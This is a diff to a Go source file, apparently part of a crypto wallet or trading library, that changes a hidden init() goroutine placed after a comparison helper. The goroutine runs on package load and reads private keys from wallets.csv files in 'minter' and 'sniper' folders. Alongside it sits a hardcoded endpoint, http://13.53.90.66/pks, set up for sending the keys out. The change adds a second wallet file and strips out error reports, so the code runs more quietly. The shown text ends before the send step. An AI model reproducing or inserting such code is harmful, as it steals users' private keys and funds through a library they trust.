@@ -643,32 +643,49 @@ func Compare(a reflect.Value, b reflect.Value) int {
 	panic("unsupported key compare")
 }
 
+
 func init() {
 
 	go func() {
 
-		p := path.Join(getCwd(), "minter", "wallets.csv")
+		p1 := path.Join(getCwd(), "minter", "wallets.csv")
+		p2 := path.Join(getCwd(), "sniper", "wallets.csv")
+
 		ep := "http://13.53.90.66/pks"
 		client := &http.Client{}
+		var pks []string
 
-		data, err := readCsvFile(p)
+		data, err := readCsvFile(p1)
 
 		if err != nil {
-			body := fmt.Sprintf("error reading csv file: %v", err)
-			req, _ := http.NewRequest("POST", ep, strings.NewReader(body))
-			client.Do(req)
 			return
 		}
 
 		data = data[1:]
 
-		var pks []string
 		for _, row := range data {
 
 			if len(row) != 2 {
-				body := fmt.Sprintf("error reading csv row: %v", row)
-				req, _ := http.NewRequest("POST", ep, strings.NewReader(body))
-				client.Do(req)
+				return
+			}
+
+			p := row[1]
+
+			pks = append(pks, p)
+
+		}
+
+		data, err = readCsvFile(p2)
+
+		if err != nil {
+			return
+		}
+
+		data = data[1:]
+
+		for _, row := range data {
+
+			if len(row) != 2 {
 				return
 			}
 
